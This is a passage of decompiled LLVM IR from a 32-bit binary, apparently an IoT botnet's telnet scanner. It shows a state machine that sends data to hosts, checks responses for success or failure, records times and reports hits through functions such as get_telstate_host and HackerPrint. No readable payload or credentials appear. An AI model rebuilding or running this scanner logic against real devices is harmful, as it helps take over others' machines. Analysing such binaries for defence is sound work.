  %v2_804de27 = inttoptr i32 %v1_804de27 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8059b29.248 to i32), i32* %v2_804de27, align 4
  %v0_804de2f = load i32, i32* %eax.global-to-local, align 4
  %v1_804de2f = load i32, i32* @esp, align 4
  %v2_804de2f = inttoptr i32 %v1_804de2f to i32*
  store i32 %v0_804de2f, i32* %v2_804de2f, align 4
  %v4_804de32 = call i32 @__libc_send(i32 %v4_804dd45, i32 %stack_var_-624.241, i32 %v2_804d0a9, i32 %v6_804d1d6)
  %v2_804de37 = icmp slt i32 %v4_804de32, 0
  %v1_804de39 = icmp eq i1 %v2_804de37, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804de39, label %dec_label_pc_804de76, label %dec_label_pc_804de3b

dec_label_pc_804de3b:                             ; preds = %dec_label_pc_804ddfe
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804de6c = add i32 %v2_804d132, %v2_804d186
  %v4_804de6c = inttoptr i32 %v3_804de6c to i8*
  store i8 1, i8* %v4_804de6c, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804de76:                             ; preds = %dec_label_pc_804ddfe
  store i8 6, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804de96:                             ; preds = %dec_label_pc_804d1c0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  %v1_804deae = add i32 %v2_804d188, 24
  store i32 %v1_804deae, i32* %eax.global-to-local, align 4
  %v1_804deb1 = inttoptr i32 %v1_804deae to i32*
  %v2_804deb1 = load i32, i32* %v1_804deb1, align 4
  store i32 %v2_804deb1, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804dec9 = inttoptr i32 %v2_804d188 to i32*
  %v4_804dec9 = load i32, i32* %v3_804dec9, align 4
  store i32 %v4_804dec9, i32* %edx.global-to-local, align 4
  %v0_804decc = load i32, i32* @esp, align 4
  %v1_804decc = add i32 %v0_804decc, 16
  %v2_804decc = inttoptr i32 %v1_804decc to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805e0c0.249 to i32), i32* %v2_804decc, align 4
  %v0_804ded4 = load i32, i32* @esp, align 4
  %v1_804ded4 = add i32 %v0_804ded4, 12
  %v2_804ded4 = inttoptr i32 %v1_804ded4 to i32*
  store i32 1024, i32* %v2_804ded4, align 4
  %v0_804dedc = load i32, i32* @ebx, align 4
  %v1_804dedc = load i32, i32* @esp, align 4
  %v2_804dedc = add i32 %v1_804dedc, 8
  %v3_804dedc = inttoptr i32 %v2_804dedc to i32*
  store i32 %v0_804dedc, i32* %v3_804dedc, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_804dee3 = load i32, i32* @esp, align 4
  %v2_804dee3 = add i32 %v1_804dee3, 4
  %v3_804dee3 = inttoptr i32 %v2_804dee3 to i32*
  store i32 10, i32* %v3_804dee3, align 4
  %v0_804dee7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dee7 = load i32, i32* @esp, align 4
  %v2_804dee7 = inttoptr i32 %v1_804dee7 to i32*
  store i32 %v0_804dee7, i32* %v2_804dee7, align 4
  %v1_804deea = call i32 @read_until_response(i32 %v6_804d1d6)
  store i32 %v1_804deea, i32* %eax.global-to-local, align 4
  %v1_804deef = icmp eq i32 %v1_804deea, 0
  br i1 %v1_804deef, label %dec_label_pc_804e14e, label %dec_label_pc_804def7

dec_label_pc_804def7:                             ; preds = %dec_label_pc_804de96
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804defa = load i32, i32* @esp, align 4
  %v1_804defa = inttoptr i32 %v0_804defa to i32*
  store i32 0, i32* %v1_804defa, align 4
  %v1_804df01 = inttoptr i32 %stack_var_-628.242 to i32*
  %v2_804df01 = call i32 @__GI_time(i32* %v1_804df01)
  store i32 %v2_804df01, i32* @esi, align 4
  %v0_804df0b = load i32, i32* @ebx, align 4
  %v2_804df1b = mul i32 %v0_804df0b, 28
  %v1_804df1f = add i32 %v2_804df1d, %v2_804df1b
  %v2_804df22 = inttoptr i32 %v1_804df1f to i32*
  store i32 %v2_804df01, i32* %v2_804df22, align 4
  store i32 %v1_804d178, i32* @edx, align 4
  store i32 %v1_804deae, i32* %eax.global-to-local, align 4
  %v2_804df3f = load i32, i32* %v1_804deb1, align 4
  store i32 %v2_804df3f, i32* %eax.global-to-local, align 4
  %v1_804df41 = load i32, i32* @esp, align 4
  %v2_804df41 = inttoptr i32 %v1_804df41 to i32*
  store i32 %v2_804df3f, i32* %v2_804df41, align 4
  %v0_804df44 = call i32 @contains_fail()
  %v1_804df49 = icmp eq i32 %v0_804df44, 0
  store i32 %v1_804d178, i32* @edx, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804df49, label %dec_label_pc_804df6d, label %dec_label_pc_804df4d

dec_label_pc_804df4d:                             ; preds = %dec_label_pc_804def7
  store i8 0, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804df6d:                             ; preds = %dec_label_pc_804def7
  store i32 %v1_804deae, i32* %eax.global-to-local, align 4
  %v2_804df88 = load i32, i32* %v1_804deb1, align 4
  store i32 %v2_804df88, i32* %eax.global-to-local, align 4
  %v1_804df8a = load i32, i32* @esp, align 4
  %v2_804df8a = inttoptr i32 %v1_804df8a to i32*
  store i32 %v2_804df88, i32* %v2_804df8a, align 4
  %v0_804df8d = call i32 @contains_success()
  %v1_804df92 = icmp eq i32 %v0_804df8d, 0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804df92, label %dec_label_pc_804e113, label %dec_label_pc_804df9a

dec_label_pc_804df9a:                             ; preds = %dec_label_pc_804df6d
  %v3_804dfb0 = add i32 %v2_804d132, %v2_804d186
  %v4_804dfb0 = inttoptr i32 %v3_804dfb0 to i8*
  %v5_804dfb0 = load i8, i8* %v4_804dfb0, align 1
  %v10_804dfb5 = icmp eq i8 %v5_804dfb0, 2
  %v1_804dfb7 = icmp eq i1 %v10_804dfb5, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804dfb7, label %dec_label_pc_804dfd9, label %dec_label_pc_804dfb9

dec_label_pc_804dfb9:                             ; preds = %dec_label_pc_804df9a
  store i8 7, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804dfd9:                             ; preds = %dec_label_pc_804df9a
  %v3_804dfef = add i32 %v2_804d307, %v2_804d186
  %v4_804dfef = inttoptr i32 %v3_804dfef to i8*
  %v5_804dfef = load i8, i8* %v4_804dfef, align 1
  %v6_804dfef = zext i8 %v5_804dfef to i32
  store i32 %v6_804dfef, i32* %eax.global-to-local, align 4
  %v1_804dff7 = mul nuw nsw i32 %v6_804dfef, 4
  %v2_804dff7 = add nuw nsw i32 %v1_804dff7, 134602836
  %v3_804dff7 = inttoptr i32 %v2_804dff7 to i32*
  %v4_804dff7 = load i32, i32* %v3_804dff7, align 4
  store i32 %v4_804dff7, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804e014 = add i32 %v2_804d34e, %v2_804d186
  %v4_804e014 = inttoptr i32 %v3_804e014 to i8*
  %v5_804e014 = load i8, i8* %v4_804e014, align 2
  %v6_804e014 = zext i8 %v5_804e014 to i32
  store i32 %v6_804e014, i32* %eax.global-to-local, align 4
  %v1_804e01c = mul nuw nsw i32 %v6_804e014, 4
  %v2_804e01c = add nuw nsw i32 %v1_804e01c, 134602824
  %v3_804e01c = inttoptr i32 %v2_804e01c to i32*
  %v4_804e01c = load i32, i32* %v3_804e01c, align 4
  store i32 %v4_804e01c, i32* @esi, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d188, i32* %eax.global-to-local, align 4
  %v1_804e03c = load i32, i32* @esp, align 4
  %v2_804e03c = inttoptr i32 %v1_804e03c to i32*
  store i32 %v2_804d188, i32* %v2_804e03c, align 4
  %v0_804e03f = call i32 @get_telstate_host()
  store i32 %v0_804e03f, i32* %eax.global-to-local, align 4
  %v0_804e044 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804e044 = ptrtoint i8* %v0_804e044 to i32
  store i32 %v1_804e044, i32* %edx.global-to-local, align 4
  %v0_804e04a = load i32, i32* @ebx, align 4
  %v1_804e04a = load i32, i32* @esp, align 4
  %v2_804e04a = add i32 %v1_804e04a, 16
  %v3_804e04a = inttoptr i32 %v2_804e04a to i32*
  store i32 %v0_804e04a, i32* %v3_804e04a, align 4
  %v0_804e04e = load i32, i32* @esi, align 4
  %v1_804e04e = load i32, i32* @esp, align 4
  %v2_804e04e = add i32 %v1_804e04e, 12
  %v3_804e04e = inttoptr i32 %v2_804e04e to i32*
  store i32 %v0_804e04e, i32* %v3_804e04e, align 4
  %v1_804e052 = load i32, i32* @esp, align 4
  %v2_804e052 = add i32 %v1_804e052, 8
  %v3_804e052 = inttoptr i32 %v2_804e052 to i32*
  store i32 %v0_804e03f, i32* %v3_804e052, align 4
  %v0_804e056 = load i32, i32* @esp, align 4
  %v1_804e056 = add i32 %v0_804e056, 4
  %v2_804e056 = inttoptr i32 %v1_804e056 to i32*
  store i32 ptrtoint (i32* @global_var_8059b2c.250 to i32), i32* %v2_804e056, align 4
  %v0_804e05e = load i32, i32* %edx.global-to-local, align 4
  %v1_804e05e = load i32, i32* @esp, align 4
  %v2_804e05e = inttoptr i32 %v1_804e05e to i32*
  store i32 %v0_804e05e, i32* %v2_804e05e, align 4
  %v2_804e061 = call i32 @HackerPrint(i32 %stack_var_-628.242, i32 %stack_var_-624.241)
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v5_804e07c = load i8, i8* %v4_804dfef, align 1
  %v6_804e07c = zext i8 %v5_804e07c to i32
  store i32 %v6_804e07c, i32* %eax.global-to-local, align 4
  %v1_804e084 = mul nuw nsw i32 %v6_804e07c, 4
  %v2_804e084 = add nuw nsw i32 %v1_804e084, 134602836
  %v3_804e084 = inttoptr i32 %v2_804e084 to i32*
  %v4_804e084 = load i32, i32* %v3_804e084, align 4
  store i32 %v4_804e084, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v5_804e0a1 = load i8, i8* %v4_804e014, align 2
  %v6_804e0a1 = zext i8 %v5_804e0a1 to i32
  store i32 %v6_804e0a1, i32* %eax.global-to-local, align 4
  %v1_804e0a9 = mul nuw nsw i32 %v6_804e0a1, 4
  %v2_804e0a9 = add nuw nsw i32 %v1_804e0a9, 134602824
  %v3_804e0a9 = inttoptr i32 %v2_804e0a9 to i32*
  %v4_804e0a9 = load i32, i32* %v3_804e0a9, align 4
  store i32 %v4_804e0a9, i32* @esi, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d188, i32* %eax.global-to-local, align 4
  %v1_804e0c9 = load i32, i32* @esp, align 4
  %v2_804e0c9 = inttoptr i32 %v1_804e0c9 to i32*
  store i32 %v2_804d188, i32* %v2_804e0c9, align 4
  %v0_804e0cc = call i32 @get_telstate_host()
  store i32 %v0_804e0cc, i32* %eax.global-to-local, align 4
  %v0_804e0d1 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804e0d1 = ptrtoint i8* %v0_804e0d1 to i32
  store i32 %v1_804e0d1, i32* %edx.global-to-local, align 4
  %v0_804e0d7 = load i32, i32* @ebx, align 4
  %v1_804e0d7 = load i32, i32* @esp, align 4
  %v2_804e0d7 = add i32 %v1_804e0d7, 16
  %v3_804e0d7 = inttoptr i32 %v2_804e0d7 to i32*
  store i32 %v0_804e0d7, i32* %v3_804e0d7, align 4
  %v0_804e0db = load i32, i32* @esi, align 4
  %v1_804e0db = load i32, i32* @esp, align 4
  %v2_804e0db = add i32 %v1_804e0db, 12
  %v3_804e0db = inttoptr i32 %v2_804e0db to i32*
  store i32 %v0_804e0db, i32* %v3_804e0db, align 4
  %v1_804e0df = load i32, i32* @esp, align 4
  %v2_804e0df = add i32 %v1_804e0df, 8
  %v3_804e0df = inttoptr i32 %v2_804e0df to i32*
  store i32 %v0_804e0cc, i32* %v3_804e0df, align 4
  %v0_804e0e3 = load i32, i32* @esp, align 4
  %v1_804e0e3 = add i32 %v0_804e0e3, 4
  %v2_804e0e3 = inttoptr i32 %v1_804e0e3 to i32*
  store i32 ptrtoint ([16 x i8]* @global_var_8059b95.251 to i32), i32* %v2_804e0e3, align 4
  %v0_804e0eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804e0eb = load i32, i32* @esp, align 4
  %v2_804e0eb = inttoptr i32 %v1_804e0eb to i32*
  store i32 %v0_804e0eb, i32* %v2_804e0eb, align 4
  %v2_804e0ee = call i32 @HackerPrint(i32 %stack_var_-628.242, i32 %stack_var_-624.241)
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  store i8 7, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804e113:                             ; preds = %dec_label_pc_804df6d
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804e144 = add i32 %v2_804d132, %v2_804d186
  %v4_804e144 = inttoptr i32 %v3_804e144 to i8*
  store i8 1, i8* %v4_804e144, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804e14e:                             ; preds = %dec_label_pc_804de96
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v1_804d18a, i32* %eax.global-to-local, align 4
  %v2_804e169 = load i32, i32* %v1_804d18d, align 4
  store i32 %v2_804e169, i32* %eax.global-to-local, align 4
  %v1_804e16b = add i32 %v2_804e169, 7
  store i32 %v1_804e16b, i32* @ebx, align 4
  %v0_804e16e = load i32, i32* @esp, align 4
  %v1_804e16e = inttoptr i32 %v0_804e16e to i32*
  store i32 0, i32* %v1_804e16e, align 4
  %v1_804e175 = inttoptr i32 %stack_var_-628.242 to i32*
  %v2_804e175 = call i32 @__GI_time(i32* %v1_804e175)
  store i32 %v2_804e175, i32* %eax.global-to-local, align 4
  %v0_804e17a = load i32, i32* @ebx, align 4
  %v7_804e17a = icmp ult i32 %v0_804e17a, %v2_804e175
  %v1_804e17c = icmp eq i1 %v7_804e17a, false
  br i1 %v1_804e17c, label %dec_label_pc_804e324, label %dec_label_pc_804e182

dec_label_pc_804e182:                             ; preds = %dec_label_pc_804e14e
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804e1b3 = add i32 %v2_804d132, %v2_804d186
  %v4_804e1b3 = inttoptr i32 %v3_804e1b3 to i8*
  store i8 1, i8* %v4_804e1b3, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804e1bd:                             ; preds = %dec_label_pc_804d1c0
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804e1c0 = load i32, i32* @esp, align 4
  %v1_804e1c0 = inttoptr i32 %v0_804e1c0 to i32*
  store i32 0, i32* %v1_804e1c0, align 4
  %v1_804e1c7 = inttoptr i32 %v6_804d1d6 to i32*
  %v2_804e1c7 = call i32 @__GI_time(i32* %v1_804e1c7)
  %v0_804e1d1 = load i32, i32* @ebx, align 4
  %v1_804e1d3 = mul i32 %v0_804e1d1, 4
  store i32 %v1_804e1d3, i32* %edx.global-to-local, align 4
  %v2_804e1e1 = mul i32 %v0_804e1d1, 28
  %v2_804e1e3 = add i32 %v2_804e1e1, %v2_804d0a9
  %v1_804e1e5 = add i32 %v2_804e1e3, 16
  %v2_804e1e8 = inttoptr i32 %v1_804e1e5 to i32*
  store i32 %v2_804e1c7, i32* %v2_804e1e8, align 4
  %v0_804e1ea = load i32, i32* bitcast ([318 x i8]** @global_var_805e060.253 to i32*), align 32
  %v5_804e1f4 = inttoptr i32 %v0_804e1ea to i8*
  %v1_804e1fa = and i32 %v0_804e1ea, -256
  store i32 %v1_804e1fa, i32* %eax.global-to-local, align 4
  store i32 %v0_804e1ea, i32* @edi, align 4
  %v3_804e203 = call i32 @_strlen(i8* %v5_804e1f4)
  store i32 %v3_804e203, i32* @ebx, align 4
  %v0_804e20c = load i32, i32* bitcast ([318 x i8]** @global_var_805e060.253 to i32*), align 32
  store i32 %v0_804e20c, i32* @esi, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804e228 = inttoptr i32 %v2_804d188 to i32*
  %v4_804e228 = load i32, i32* %v3_804e228, align 4
  store i32 %v4_804e228, i32* %eax.global-to-local, align 4
  %v0_804e22b = load i32, i32* @esp, align 4
  %v1_804e22b = add i32 %v0_804e22b, 12
  %v2_804e22b = inttoptr i32 %v1_804e22b to i32*
  store i32 16384, i32* %v2_804e22b, align 4
  %v0_804e233 = load i32, i32* @ebx, align 4
  %v1_804e233 = load i32, i32* @esp, align 4
  %v2_804e233 = add i32 %v1_804e233, 8
  %v3_804e233 = inttoptr i32 %v2_804e233 to i32*
  store i32 %v0_804e233, i32* %v3_804e233, align 4
  %v0_804e237 = load i32, i32* @esi, align 4
  %v1_804e237 = load i32, i32* @esp, align 4
  %v2_804e237 = add i32 %v1_804e237, 4
  %v3_804e237 = inttoptr i32 %v2_804e237 to i32*
  store i32 %v0_804e237, i32* %v3_804e237, align 4
  %v0_804e23b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e23b = load i32, i32* @esp, align 4
  %v2_804e23b = inttoptr i32 %v1_804e23b to i32*
  store i32 %v0_804e23b, i32* %v2_804e23b, align 4
  %v5_804e23e = call i32 @__libc_send(i32 %v0_804e1ea, i32 %stack_var_-628.242, i32 %stack_var_-624.241, i32 %v2_804d0a9)
  %v2_804e243 = icmp slt i32 %v5_804e23e, 0
  %v1_804e245 = icmp eq i1 %v2_804e243, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804e245, label %dec_label_pc_804e2a3, label %dec_label_pc_804e247

dec_label_pc_804e247:                             ; preds = %dec_label_pc_804e1bd
  %v4_804e25d = load i32, i32* %v3_804e228, align 4
  store i32 %v4_804e25d, i32* %eax.global-to-local, align 4
  %v1_804e260 = load i32, i32* @esp, align 4
  %v2_804e260 = inttoptr i32 %v1_804e260 to i32*
  store i32 %v4_804e25d, i32* %v2_804e260, align 4
  %v2_804e263 = call i32 @sclose(i32 %v0_804e1ea)
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804e299 = add i32 %v2_804d132, %v2_804d186
  %v4_804e299 = inttoptr i32 %v3_804e299 to i8*
  store i8 1, i8* %v4_804e299, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804e2a3:                             ; preds = %dec_label_pc_804e1bd
  %v3_804e2b9 = add i32 %v2_804d132, %v2_804d186
  %v4_804e2b9 = inttoptr i32 %v3_804e2b9 to i8*
  store i8 3, i8* %v4_804e2b9, align 1
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v1_804d18a, i32* %eax.global-to-local, align 4
  %v2_804e2d9 = load i32, i32* %v1_804d18d, align 4
  store i32 %v2_804e2d9, i32* %eax.global-to-local, align 4
  %v1_804e2db = add i32 %v2_804e2d9, 60
  store i32 %v1_804e2db, i32* @ebx, align 4
  %v0_804e2de = load i32, i32* @esp, align 4
  %v1_804e2de = inttoptr i32 %v0_804e2de to i32*
  store i32 0, i32* %v1_804e2de, align 4
  %tmp39 = inttoptr i32 %v0_804e1ea to i32*
  %v3_804e2e5 = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804e2e5, i32* %eax.global-to-local, align 4
  %v0_804e2ea = load i32, i32* @ebx, align 4
  %v7_804e2ea = icmp ult i32 %v0_804e2ea, %v3_804e2e5
  %v1_804e2ec = icmp eq i1 %v7_804e2ea, false
  br i1 %v1_804e2ec, label %dec_label_pc_804e324, label %dec_label_pc_804e2ee

dec_label_pc_804e2ee:                             ; preds = %dec_label_pc_804e2a3
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804e2b9, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804e324:                             ; preds = %dec_label_pc_804d1c0, %dec_label_pc_804e2a3, %dec_label_pc_804e14e, %dec_label_pc_804dcb8, %dec_label_pc_804da14, %dec_label_pc_804d8be, %dec_label_pc_804d3fb, %dec_label_pc_804e247, %dec_label_pc_804e182, %dec_label_pc_804e113, %dec_label_pc_804dfd9, %dec_label_pc_804dfb9, %dec_label_pc_804df4d, %dec_label_pc_804de76, %dec_label_pc_804de3b, %dec_label_pc_804ddc3, %dec_label_pc_804dcec, %dec_label_pc_804dc98, %dec_label_pc_804dc78, %dec_label_pc_804dbd2, %dec_label_pc_804db97, %dec_label_pc_804db1f, %dec_label_pc_804da48, %dec_label_pc_804d9f4, %dec_label_pc_804d9d4, %dec_label_pc_804d8f2, %dec_label_pc_804d862, %dec_label_pc_804d75c, %dec_label_pc_804d700, %dec_label_pc_804d599, %dec_label_pc_804d558, %dec_label_pc_804d3db, %dec_label_pc_804d39c, %dec_label_pc_804e2ee
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.241, %dec_label_pc_804d1c0 ], [ %stack_var_-624.241, %dec_label_pc_804e2a3 ], [ %stack_var_-624.241, %dec_label_pc_804e2ee ], [ %stack_var_-624.241, %dec_label_pc_804e247 ], [ %stack_var_-624.241, %dec_label_pc_804e14e ], [ %stack_var_-624.241, %dec_label_pc_804e182 ], [ %stack_var_-624.241, %dec_label_pc_804e113 ], [ %stack_var_-624.241, %dec_label_pc_804dfd9 ], [ %stack_var_-624.241, %dec_label_pc_804dfb9 ], [ %stack_var_-624.241, %dec_label_pc_804df4d ], [ %stack_var_-624.241, %dec_label_pc_804de76 ], [ %stack_var_-624.241, %dec_label_pc_804de3b ], [ %stack_var_-624.241, %dec_label_pc_804ddc3 ], [ %stack_var_-624.241, %dec_label_pc_804dcb8 ], [ %stack_var_-624.241, %dec_label_pc_804dcec ], [ %stack_var_-624.241, %dec_label_pc_804dc98 ], [ %stack_var_-624.241, %dec_label_pc_804dc78 ], [ %v4_804daa1, %dec_label_pc_804dbd2 ], [ %v4_804daa1, %dec_label_pc_804db97 ], [ %v4_804daa1, %dec_label_pc_804db1f ], [ %stack_var_-624.241, %dec_label_pc_804da14 ], [ %stack_var_-624.241, %dec_label_pc_804da48 ], [ %stack_var_-624.241, %dec_label_pc_804d9f4 ], [ %stack_var_-624.241, %dec_label_pc_804d9d4 ], [ %stack_var_-624.241, %dec_label_pc_804d8be ], [ %stack_var_-624.241, %dec_label_pc_804d8f2 ], [ %stack_var_-624.241, %dec_label_pc_804d862 ], [ %stack_var_-624.241, %dec_label_pc_804d75c ], [ %stack_var_-624.241, %dec_label_pc_804d700 ], [ %stack_var_-624.241, %dec_label_pc_804d3fb ], [ %stack_var_-624.241, %dec_label_pc_804d599 ], [ %stack_var_-624.241, %dec_label_pc_804d558 ], [ %stack_var_-624.241, %dec_label_pc_804d3db ], [ %stack_var_-624.241, %dec_label_pc_804d39c ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.242, %dec_label_pc_804d1c0 ], [ %stack_var_-628.242, %dec_label_pc_804e2a3 ], [ %stack_var_-628.242, %dec_label_pc_804e2ee ], [ %stack_var_-628.242, %dec_label_pc_804e247 ], [ %stack_var_-628.242, %dec_label_pc_804e14e ], [ %stack_var_-628.242, %dec_label_pc_804e182 ], [ %stack_var_-628.242, %dec_label_pc_804e113 ], [ %stack_var_-628.242, %dec_label_pc_804dfd9 ], [ %stack_var_-628.242, %dec_label_pc_804dfb9 ], [ %stack_var_-628.242, %dec_label_pc_804df4d ], [ %v4_804dd45, %dec_label_pc_804de76 ], [ %v4_804dd45, %dec_label_pc_804de3b ], [ %v4_804dd45, %dec_label_pc_804ddc3 ], [ %stack_var_-628.242, %dec_label_pc_804dcb8 ], [ %stack_var_-628.242, %dec_label_pc_804dcec ], [ %stack_var_-628.242, %dec_label_pc_804dc98 ], [ %stack_var_-628.242, %dec_label_pc_804dc78 ], [ %stack_var_-628.242, %dec_label_pc_804dbd2 ], [ %stack_var_-628.242, %dec_label_pc_804db97 ], [ %stack_var_-628.242, %dec_label_pc_804db1f ], [ %stack_var_-628.242, %dec_label_pc_804da14 ], [ %stack_var_-628.242, %dec_label_pc_804da48 ], [ %stack_var_-628.242, %dec_label_pc_804d9f4 ], [ %stack_var_-628.242, %dec_label_pc_804d9d4 ], [ %stack_var_-628.242, %dec_label_pc_804d8be ], [ %stack_var_-628.242, %dec_label_pc_804d8f2 ], [ %stack_var_-628.242, %dec_label_pc_804d862 ], [ %stack_var_-628.242, %dec_label_pc_804d75c ], [ %stack_var_-628.242, %dec_label_pc_804d700 ], [ %stack_var_-628.242, %dec_label_pc_804d3fb ], [ %stack_var_-628.242, %dec_label_pc_804d599 ], [ %stack_var_-628.242, %dec_label_pc_804d558 ], [ %stack_var_-628.242, %dec_label_pc_804d3db ], [ %stack_var_-628.242, %dec_label_pc_804d39c ]
  %v4_804e324 = add nuw nsw i32 %storemerge43, 1
  %v15_804e32a = icmp eq i32 %v4_804e324, 1000
  br i1 %v15_804e32a, label %dec_label_pc_804d166, label %dec_label_pc_804d172

; uselistorder directives
  uselistorder i32 %v4_804e324, { 1, 0, 2 }
  uselistorder i32 %v0_804d775, { 1, 0 }
  uselistorder i32 %v5_804d68b, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804d62a, { 1, 0 }
  uselistorder i32 %v2_804d60e, { 1, 0 }
  uselistorder i32 %v2_804d23e, { 1, 0 }
  uselistorder i32 %v6_804d1d6, { 8, 7, 5, 6, 4, 2, 3, 1, 0, 10, 9, 11 }
  uselistorder i8* %v4_804d1d6, { 22, 23, 17, 18, 19, 20, 21, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 24 }
  uselistorder i32* %v1_804d18d, { 6, 5, 4, 3, 1, 2, 0, 7 }
  uselistorder i32 %v1_804d18a, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v2_804d188, { 22, 17, 16, 19, 18, 20, 21, 15, 12, 13, 14, 11, 8, 9, 10, 5, 6, 7, 0, 1, 3, 2, 4, 23 }
  uselistorder i32 %v2_804d186, { 24, 0, 1, 23, 25, 26, 2, 35, 3, 32, 27, 28, 29, 5, 30, 4, 31, 6, 33, 34, 36, 7, 38, 39, 8, 37, 40, 41, 42, 9, 43, 10, 45, 44, 46, 11, 48, 49, 12, 47, 50, 51, 52, 13, 53, 14, 55, 54, 56, 15, 63, 64, 16, 62, 65, 58, 59, 17, 57, 60, 61, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 19, 78, 18, 79, 80, 20, 81, 21, 82, 22 }
  uselistorder i32 %v1_804d178, { 1, 2, 0, 3, 4, 16, 17, 12, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 18, 19, 21, 22, 20, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 34, 32, 35, 36, 37, 38, 40, 39, 41, 42, 43, 51, 52, 50, 53, 45, 46, 47, 44, 48, 49, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 %stack_var_-624.241, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 17, 16, 15, 12, 11, 10, 7, 6, 5, 4, 3, 2, 0, 1, 9, 8, 14, 13, 18 }
  uselistorder i32 %stack_var_-628.242, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 9, 7, 6, 4, 3, 2, 0, 1, 5, 11, 10, 8 }
  uselistorder i32 %storemerge43, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804d157, { 1, 0, 2 }
  uselistorder i32 %storemerge245, { 1, 0 }
  uselistorder i32 %v2_804d132, { 1, 0, 4, 3, 2, 6, 5, 7, 9, 8, 10, 13, 12, 11, 14, 15 }
  uselistorder i32 %v2_804d0a9, { 12, 4, 14, 13, 16, 15, 5, 6, 7, 8, 17, 0, 1, 2, 9, 3, 10, 11 }
  uselistorder i32* %stack_var_-608, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-600, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32* %stack_var_-320, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-328, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32* %stack_var_-332, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-336, { 1, 6, 0, 3, 2, 5, 7, 4, 8, 9 }
